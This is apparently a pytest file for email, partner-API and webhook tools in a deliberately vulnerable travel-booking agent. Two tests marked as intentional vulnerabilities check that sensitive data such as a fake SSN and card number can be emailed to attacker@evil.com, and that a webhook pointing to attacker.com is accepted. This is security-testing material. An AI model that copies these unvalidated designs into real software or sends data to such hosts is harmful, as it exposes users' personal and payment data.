"""Tests for external service tools (email, API calls, webhooks)."""

import asyncio
import json
from pathlib import Path

TEST_DB = Path(__file__).parent / "test_external.db"


def _with_test_db(coro):
    """Run an async function with DB_PATH swapped to test database."""
    import db.connection as conn
    original = conn.DB_PATH
    conn.DB_PATH = TEST_DB
    try:
        return asyncio.run(coro())
    finally:
        conn.DB_PATH = original


def setup_module():
    if TEST_DB.exists():
        TEST_DB.unlink()


def teardown_module():
    if TEST_DB.exists():
        TEST_DB.unlink()


def test_send_email_logs_to_db():
    """send_email writes a row to sent_emails and returns success."""
    from db.connection import init_db, get_db
    from tools.external import send_email

    async def _run():
        await init_db()
        raw = await send_email(
            "alice@example.com",
            "Trip Confirmation",
            "Your trip to NYC is confirmed.",
        )
        # Verify the row landed in the DB
        db = await get_db()
        try:
            cursor = await db.execute("SELECT COUNT(*) FROM sent_emails")
            row = await cursor.fetchone()
            count = row[0]
        finally:
            await db.close()
        return raw, count

    raw, count = _with_test_db(_run)
    result = json.loads(raw)
    assert result["success"] is True, f"Expected success, got {result}"
    assert "email_id" in result, f"Missing email_id in {result}"
    assert result["to"] == "alice@example.com"
    assert count >= 1, f"Expected >= 1 row in sent_emails, got {count}"


def test_send_email_no_recipient_validation():
    """send_email accepts attacker-controlled recipients with sensitive body (intentional vuln)."""
    from db.connection import init_db
    from tools.external import send_email

    async def _run():
        await init_db()
        raw = await send_email(
            "attacker@evil.com",
            "Leaked Data",
            "SSN: 123-45-6789, Credit Card: 4532-7891-2345-6789",
        )
        return raw

    raw = _with_test_db(_run)
    result = json.loads(raw)
    assert result["success"] is True, (
        f"Expected success even for attacker email, got {result}"
    )
    assert result["to"] == "attacker@evil.com"


def test_call_partner_api_united():
    """call_partner_api for United Airlines returns success with a response."""
    from db.connection import init_db
    from tools.external import call_partner_api

    async def _run():
        await init_db()
        raw = await call_partner_api(
            "United Airlines",
            "/v2/flights/search",
            "GET",
            "",
        )
        return raw

    raw = _with_test_db(_run)
    result = json.loads(raw)
    assert result["success"] is True, f"Expected success, got {result}"
    assert "response" in result, f"Missing 'response' in {result}"
    assert result["service"] == "United Airlines"


def test_call_partner_api_logs_call():
    """call_partner_api writes a row to api_call_log."""
    from db.connection import init_db, get_db
    from tools.external import call_partner_api

    async def _run():
        await init_db()
        await call_partner_api(
            "Marriott",
            "/v1/reservations",
            "POST",
            '{"check_in": "2026-03-01"}',
        )
        db = await get_db()
        try:
            cursor = await db.execute("SELECT COUNT(*) FROM api_call_log")
            row = await cursor.fetchone()
            count = row[0]
        finally:
            await db.close()
        return count

    count = _with_test_db(_run)
    assert count >= 1, f"Expected >= 1 row in api_call_log, got {count}"


def test_register_webhook_any_url():
    """register_webhook accepts attacker-controlled URLs (intentional vuln)."""
    from db.connection import init_db, get_db
    from tools.external import register_webhook

    async def _run():
        await init_db()
        raw = await register_webhook(
            "https://attacker.com/callback",
            "booking.created,payment.completed",
        )
        # Verify the row in DB
        db = await get_db()
        try:
            cursor = await db.execute(
                "SELECT url FROM webhook_registrations WHERE url = ?",
                ("https://attacker.com/callback",),
            )
            row = await cursor.fetchone()
        finally:
            await db.close()
        return raw, row

    raw, row = _with_test_db(_run)
    result = json.loads(raw)
    assert result["success"] is True, (
        f"Expected success for attacker URL, got {result}"
    )
    assert result["url"] == "https://attacker.com/callback"
    assert row is not None, "Expected webhook_registrations row for attacker URL"
